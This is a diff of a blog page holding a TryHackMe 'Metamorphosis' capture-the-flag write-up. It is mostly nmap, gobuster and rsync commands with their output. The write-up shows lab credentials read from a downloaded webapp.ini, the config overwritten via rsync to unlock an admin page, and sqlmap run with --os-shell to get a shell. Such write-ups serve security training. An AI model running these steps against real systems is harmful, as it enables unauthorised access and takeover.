@@ -200,104 +200,129 @@
                 post-container">
 
                 
-                <p>First we start with the basic nmap scan</p>
-<p>root@kali:~/tryhackme/metamorphosis#nmap -sC -sV  10.10.97.133
-Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-08-12 11:32 IST
-Nmap scan report for 10.10.97.133 (10.10.97.133)
-Host is up (0.16s latency).</p>
-<p>PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be (RSA)
-|   256 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 (ECDSA)
-|_  256 fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 (ED25519)
-80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
+                <h2 id="overview">Overview</h2>
+<p>##Inital Recon</p>
+<p>First we start with the basic nmap scan</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/tryhackme/metamorphosis#nmap -sC -sV  10.10.97.133
+Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-08-12 11:32 IST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.97.133 <span style="color:#f92672">(</span>10.10.97.133<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp  open  http        Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
 |_http-title: Apache2 Ubuntu Default Page: It works
-139/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
-873/tcp open  rsync       (protocol version 31)
-Service Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-<p>Host script results:
-|<em>clock-skew: mean: 13s, deviation: 0s, median: 13s
-|<em>nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
-| smb-os-discovery:
-|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+139/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+873/tcp open  rsync       <span style="color:#f92672">(</span>protocol version 31<span style="color:#f92672">)</span>
+Service Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 13s, deviation: 0s, median: 13s
+|_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>
+| smb-os-discovery: 
+|   OS: Windows 6.1 <span style="color:#f92672">(</span>Samba 4.7.6-Ubuntu<span style="color:#f92672">)</span>
 |   Computer name: incognito
-|   NetBIOS computer name: INCOGNITO\x00
-|   Domain name: \x00
+|   NetBIOS computer name: INCOGNITO<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+|   Domain name: <span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
 |   FQDN: incognito
-|</em>  System time: 2021-08-12T06:03:04+00:00
-| smb-security-mode:
+|_  System time: 2021-08-12T06:03:04+00:00
+| smb-security-mode: 
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
-|</em>  message_signing: disabled (dangerous, but default)
-| smb2-security-mode:
-|   2.02:
+|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+| smb2-security-mode: 
+|   2.02: 
 |_    Message signing enabled but not required
-| smb2-time:
+| smb2-time: 
 |   date: 2021-08-12T06:03:04
-|_  start_date: N/A</p>
-<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
-Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds</p>
-<p>Now accessing  the web page at port 80 we get default | Apache2 Ubuntu Default Page |</p>
-<p>Now using gobuster</p>
-<h1 id="rootkalitryhackmemetamorphosisconfgobuster-dir--u-101097133--w-usrsharewordlistsdirbusterdirectory-list-23-mediumtxt--x-htmlphptxt">root@kali:~/tryhackme/metamorphosis/conf#gobuster dir -u 10.10.97.133 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt</h1>
-<h1 id="by-oj-reeves-thecolonial--christian-mehlmauer-firefart">Gobuster v3.1.0
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</h1>
-<h1 id="-timeout-----------------10s">[+] Url:                     http://10.10.97.133
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.1.0
-[+] Extensions:              php,txt,html
-[+] Timeout:                 10s</h1>
-<h1 id="20210812-110429-starting-gobuster-in-directory-enumeration-mode">2021/08/12 11:04:29 Starting gobuster in directory enumeration mode</h1>
-<p>/index.php            (Status: 200) [Size: 10818]
-/admin                (Status: 301) [Size: 312] [&ndash;&gt; http://10.10.97.133/admin/]
-/inde.html            (Status: 200) [Size: 10918]                            <br>
-Progress: 56672 / 882244 (6.42%)</p>
-<p>Now going to http://10.10.97.133/admin</p>
-<p>We get 403 Forbidden &hellip;</p>
-<p>accessing the source code we get &ndash; make sure admin fuctionality can only be used in development mode &mdash;&mdash;&ndash;</p>
-<p>Now we have port 873 running which is Rsync you can read more about this here <a href="https://book.hacktricks.xyz/pentesting/873-pentesting-rsync">https://book.hacktricks.xyz/pentesting/873-pentesting-rsync</a></p>
-<p>Now enumerate the rync module using</p>
-<p>rsync -rdt rsync://10.10.38.244:873</p>
-<p>we get | Conf            All Confs |</p>
-<p>now listing content of Conf and dowloading its all file to local machine ..</p>
-<p>rsync -rdt rsync://10.10.38.244:873/Conf
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 20.22 seconds
+
+</code></pre></div><p>##Gobuster</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+root@kali:~/tryhackme/metamorphosis/conf#gobuster dir -u 10.10.97.133 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.97.133
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              php,txt,html
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+<span style="color:#f92672">===============================================================</span>
+2021/08/12 11:04:29 Starting gobuster in directory enumeration mode
+<span style="color:#f92672">===============================================================</span>
+/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 10818<span style="color:#f92672">]</span>
+/admin                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 312<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.97.133/admin/<span style="color:#f92672">]</span>
+/inde.html            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 10918<span style="color:#f92672">]</span>                               
+Progress: <span style="color:#ae81ff">56672</span> / <span style="color:#ae81ff">882244</span> <span style="color:#f92672">(</span>6.42%<span style="color:#f92672">)</span>               
+
+</code></pre></div><p>##Visting Webpage</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://10.10.97.133/admin
+
+</code></pre></div><p><img style="border:2px solid black" src="/images/My_New_Hugo_Site.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p>Viewing <code>source code</code></p>
+<p><img style="border:2px solid black" src="/images/My_New_Hugo_Site.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p>##Rsync Enumeration</p>
+<p>We have port 873 running which is <code>Rsync</code> you can read more about this here<a href="https://book.hacktricks.xyz/pentesting/873-pentesting-rsync">hacktricks.xyz/pentesting/873-pentesting-rsync</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rsync -rdt rsync://10.10.38.244:873
+
+we get | Conf            All Confs |
+
+</code></pre></div><p>Listing content of <code>Conf</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+rsync -rdt rsync://10.10.38.244:873/Conf
 drwxrwxrwx          4,096 2021/04/11 01:33:08 .
--rw-r&ndash;r&ndash;          4,620 2021/04/10 01:31:22 access.conf
--rw-r&ndash;r&ndash;          1,341 2021/04/10 01:26:12 bluezone.ini
--rw-r&ndash;r&ndash;          2,969 2021/04/10 01:32:24 debconf.conf
--rw-r&ndash;r&ndash;            332 2021/04/10 01:31:38 ldap.conf
--rw-r&ndash;r&ndash;         94,404 2021/04/10 01:51:57 lvm.conf
--rw-r&ndash;r&ndash;          9,005 2021/04/10 01:28:40 mysql.ini
--rw-r&ndash;r&ndash;         70,207 2021/04/10 01:26:56 php.ini
--rw-r&ndash;r&ndash;            320 2021/04/10 01:33:16 ports.conf
--rw-r&ndash;r&ndash;            589 2021/04/10 01:31:07 resolv.conf
--rw-r&ndash;r&ndash;             29 2021/04/10 01:32:56 screen-cleanup.conf
--rw-r&ndash;r&ndash;          9,542 2021/04/10 01:30:59 smb.conf
--rw-rw-r&ndash;             72 2021/04/11 01:33:06 webapp.ini</p>
-<p>Downloading &hellip;&hellip;.
-rsync -av rsync://10.10.38.244:873/Conf ./conf</p>
-<p>now reading all the files we have webapp.ini file</p>
-<p>cat webapp.ini
-[Web_App]
-env = prod
-user = tom
-password = theCat</p>
-<p>[Details]
-Local = No</p>
-<p>now the env variable is set to prod &hellip;. change this to dev(for development )</p>
-<p>and uploading back the new webapp.ini file to server &hellip;</p>
-<p>rsync -av webapp.ini rsync://10.10.101.93:873/Conf/webapp.ini</p>
-<p>Now accessing the page http://10.10.101.93/admin/</p>
-<p>we get 2.png</p>
-<p>now accessing this using brupsuite and saving the request to use the sqlmap &mdash;&mdash;&ndash;</p>
-<p>sqlmap -r req.txt &ndash;level 3 &ndash;risk 3 &ndash;batch &ndash;os-shell</p>
-<p>we get permission denied when try to run these command ..
+-rw-r--r--          4,620 2021/04/10 01:31:22 access.conf
+-rw-r--r--          1,341 2021/04/10 01:26:12 bluezone.ini
+-rw-r--r--          2,969 2021/04/10 01:32:24 debconf.conf
+-rw-r--r--            <span style="color:#ae81ff">332</span> 2021/04/10 01:31:38 ldap.conf
+-rw-r--r--         94,404 2021/04/10 01:51:57 lvm.conf
+-rw-r--r--          9,005 2021/04/10 01:28:40 mysql.ini
+-rw-r--r--         70,207 2021/04/10 01:26:56 php.ini
+-rw-r--r--            <span style="color:#ae81ff">320</span> 2021/04/10 01:33:16 ports.conf
+-rw-r--r--            <span style="color:#ae81ff">589</span> 2021/04/10 01:31:07 resolv.conf
+-rw-r--r--             <span style="color:#ae81ff">29</span> 2021/04/10 01:32:56 screen-cleanup.conf
+-rw-r--r--          9,542 2021/04/10 01:30:59 smb.conf
+-rw-rw-r--             <span style="color:#ae81ff">72</span> 2021/04/11 01:33:06 webapp.ini
+
+</code></pre></div><p>Downloading <code>Conf files</code> into local machine</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rsync -av rsync://10.10.38.244:873/Conf ./conf
+
+</code></pre></div><p>Reading all the files we got webapp.ini file</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+cat webapp.ini 
+<span style="color:#f92672">[</span>Web_App<span style="color:#f92672">]</span>
+env <span style="color:#f92672">=</span> prod
+user <span style="color:#f92672">=</span> tom
+password <span style="color:#f92672">=</span> theCat
+
+<span style="color:#f92672">[</span>Details<span style="color:#f92672">]</span>
+Local <span style="color:#f92672">=</span> No
+</code></pre></div><p>The env variable is set to <code>prod</code>  &hellip;. change this to <code>dev</code> (for development)and uploading back the new webapp.ini file to server.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+rsync -av webapp.ini rsync://10.10.101.93:873/Conf/webapp.ini  
+
+</code></pre></div><p>Accessing the admin page again  <code>http://10.10.101.93/admin/</code></p>
+<p><img style="border:2px solid black" src="/images/My_New_Hugo_Site.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p>Use <code>brupsuite</code> and saving the request as <code>req.txt</code> file</p>
+<p>##SQLmap</p>
+<p>use sqlmap <code>batch mode</code> so that it doesn&rsquo;t ask for inputs and <code>os-shell</code> to get the shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -r req.txt --level <span style="color:#ae81ff">3</span> --risk <span style="color:#ae81ff">3</span> --batch --os-shell
+
+</code></pre></div><p>we get permission denied when try to run these command ..
 and it is confirm the tcp dump was running using linpeas..</p>
 
 
